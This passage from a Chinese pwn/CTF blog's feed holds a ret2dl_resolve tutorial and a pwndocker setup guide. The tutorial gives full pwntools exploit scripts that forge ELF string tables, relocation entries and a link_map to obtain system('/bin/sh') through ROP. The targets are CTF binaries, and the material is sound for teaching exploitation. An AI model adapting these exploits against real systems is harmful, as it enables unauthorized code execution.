class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#伪造的字符串表，(0x457-0x3f8)刚好是"free\x00"字符串的偏移</span></span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line"><span class="comment">#先新建两个notes</span></span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line"><span class="comment">#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line"><span class="comment">#在0x6020C8处写入伪造的字符串表</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#会第一次调用free，所以实际上是system("/bin/sh")被调用，如前面所说</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造Elf32-Rel"><a href="#伪造Elf32-Rel" class="headerlink" title="伪造Elf32_Rel"></a>伪造Elf32_Rel</h3><p>通过操纵第二个参数，使其指向我们所构造的Elf32_Rel</p><p>当.dynamic不可写时，那么以上方法就没用了，所以有第二种利用方法<br> 上面我们讲完了函数的解析流程 主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容-&gt;st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。</p><p>所以，最终的利用思路，大概是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400610</span> ; __unwind &#123;</span><br><span class="line">.plt:<span class="number">0000000000400610</span>                 push    cs:qword_602008</span><br><span class="line">.plt:<span class="number">0000000000400616</span>                 jmp     cs:qword_602010</span><br><span class="line">.plt:<span class="number">0000000000400616</span> sub_400610      endp</span><br></pre></td></tr></table></figure></p><p>构造ROP，跳转到resolve的PLT，push link_map的位置，就是上面所示的这个地方，也就是要调用_dl_runtime_resolve的地方,此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移</p><p>伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址）</p><p>伪造Elf32_Rel即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0×100-.dynsym)/0×10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值<br>r_info=(index &lt;&lt; 8 ) | 0x7</p><p>伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处</p><p>伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如system<br>dl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数</p><p>利用思路如下:</p><p>第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure><p>第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./fun'</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080484ab</span></span><br><span class="line">leave_ret=<span class="number">0x08048378</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_stack_size=<span class="number">0x800</span></span><br><span class="line">bss=<span class="number">0x0804a01c</span></span><br><span class="line">read_plt=<span class="number">0x080482e0</span></span><br><span class="line">read_got=<span class="number">0x0804a00c</span></span><br><span class="line">bss_stage=bss+fake_stack_size</span><br><span class="line">dynsym=<span class="number">0x080481cc</span></span><br><span class="line">dynstr=<span class="number">0x0804821c</span></span><br><span class="line">dl_runtime_resolve=<span class="number">0x080482d0</span></span><br><span class="line">relplt=<span class="number">0x08048298</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_offset=bss_stage+<span class="number">28</span>-relplt</span><br><span class="line">fake_sym_addr=bss_stage+<span class="number">36</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>) <span class="comment">#为了16字节对齐</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'align==&gt;'</span>+hex(align)</span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line">index=(fake_sym_addr-dynsym)/<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'index==&gt;'</span>+hex(index)</span><br><span class="line">r_info=(index&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'r_info==&gt;'</span>+hex(r_info)</span><br><span class="line"></span><br><span class="line">fake_raloc=p32(read_got)+p32(r_info)</span><br><span class="line">st_name=fake_sym_addr-dynstr+<span class="number">16</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(dl_runtime_resolve)</span><br><span class="line">payload+=p32(rel_offset)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(bss_stage+<span class="number">80</span>)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=fake_raloc</span><br><span class="line">payload+=<span class="string">'a'</span>*align</span><br><span class="line">payload+=fake_sym</span><br><span class="line">payload+=<span class="string">'system\0'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">payload+=binsh+<span class="string">'\x00'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">100</span>-len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h3><p>64位情况下，伪造rel.plt变得不可行，因为在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=(<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); </span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx]; </span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>) </span><br><span class="line">      version = <span class="literal">NULL</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里，出现了访问未映射的内存<br>主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000<br>然后真正的rel.plt位于0x400000内，导致过大。<br>如果我们在里0x400000处有可读写的区域，或许就可以成功 </p><p>因此，我们得另外想办法，那么得回过来看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        ...  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的地址,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址</p><p>如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得</p><p>为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可,</p><p>以jiavis oj level3_x64为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x400618')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line">universal_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">universal_gadget2 = <span class="number">0x400690</span></span><br><span class="line"> </span><br><span class="line">Elf64_Sym_len = <span class="number">0x18</span></span><br><span class="line">Elf64_Rela_len = <span class="number">0x18</span></span><br><span class="line">write_addr = <span class="number">0x600ad0</span></span><br><span class="line">link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">rbp = write_addr<span class="number">-8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">leave = <span class="number">0x400618</span></span><br><span class="line">main = <span class="number">0x4005E6</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = l+0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = l+0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = l+0xf8</span></span><br><span class="line"> </span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_link_map_gen</span><span class="params">(link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + <span class="number">0x18</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr = link_map_addr + <span class="number">8</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr = link_map_addr</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(<span class="number">0</span>) + p64(link_map_addr+<span class="number">0x28</span>)</span><br><span class="line">    fake_Elf64_Dyn_SYM = p64(<span class="number">0</span>) + p64(st_value<span class="number">-8</span>)</span><br><span class="line">    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    fake_link_map = p64(l_addr)            <span class="comment">#0x8</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_SYM    <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_JMPREL <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_rela       <span class="comment">#0x18</span></span><br><span class="line">    fake_link_map += <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) <span class="comment">#link_map_addr + 0x68</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) <span class="comment">#link_map_addr + 0x70</span></span><br><span class="line">    fake_link_map += <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)</span><br><span class="line">    <span class="keyword">return</span> fake_link_map</span><br><span class="line">fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(rbp)</span><br><span class="line">payload += p64(universal_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'read'</span>])  <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(len(fake_link_map)+<span class="number">0x18</span>) <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(write_addr)  <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(universal_gadget2)  <span class="comment">#ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(main)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">fake_info = p64(<span class="number">0x4004A6</span>)        <span class="comment">#jmp</span></span><br><span class="line">fake_info += p64(link_map_addr)</span><br><span class="line">fake_info += p64(<span class="number">0</span>)</span><br><span class="line">fake_info += fake_link_map</span><br><span class="line">p.send(fake_info)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+<span class="number">0x78</span>)+p64(leave)</span><br><span class="line"><span class="comment">#stack pivot,进入函数重定向</span></span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/170661.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/sy
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>skysider/pwndocker 正确使用姿势</title>
    <link href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势/</id>
    <published>2020-02-24T03:27:00.000Z</published>
    <updated>2020-04-09T01:58:53.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。<br>一种可行的方案就是，装个16.04的虚拟机，然后在此之上装个18.04的docker，而且这个docker已经集成pwn常用工具以及各个版本libc。<br>具体参考 <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a></p><h2 id="18-04-pwndocker-安装"><a href="#18-04-pwndocker-安装" class="headerlink" title="18.04 pwndocker 安装"></a>18.04 pwndocker 安装</h2><p>docker hub 可以直接pull<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure></p><p>但是pull的太慢了，我已经把他传到了阿里云上,用下面这条命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</span><br></pre></td></tr></table></figure><p>pull完之后重命名一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</span><br></pre></td></tr></table></figure><h2 id="使用姿势"><a href="#使用姿势" class="headerlink" title="使用姿势"></a>使用姿势</h2><p>建议用官方的使用姿势，用如下命令run起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--rm \</span><br><span class="line">-h $&#123;ctf_name&#125; \</span><br><span class="line">--name $&#123;ctf_name&#125; \</span><br><span class="line">-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \</span><br><span class="line">-p 23946:23946 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">skysider/pwndocker</span><br></pre></td></tr></table></figure><p>其中有两个重要的参数<br>-v $(pwd)/${ctf_name}:/ctf/work 是将当前目录下的文件映射到 docker /ctf/work目录下<br>这样你在物理机修改文件，docker里面也会发生变化，就不用再docker cp了</p><p>–cap-add=SYS_PTRACE 这个参数也是要一定加的，不然docker里面没法用gdb调试。</p><p>可以把上述命令放到 pwndocker_run.sh里面 方便下次使用<br><img alt="" data-src="https://nocbtm.github.io/imgs/pwndocker-1.png" class="lozad"></p><p>然后调试脚本时，要先进去tmux ，python脚本里面指定终端为 tmux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;]</span><br></pre></td></tr></table></figure></p><p>就可以 gdb.attach(p)了 如下图</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/pwndocker-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。&lt;br&gt;一种可行的方案就是，
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 i春秋公益赛pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/02/22/2020-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bpwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/02/22/2020-i春秋公益赛pwn-writeup/</id>
    <published>2020-02-22T11:25:47.000Z</published>
    <updated>2020-04-01T02:12:55.941Z</updated>
    
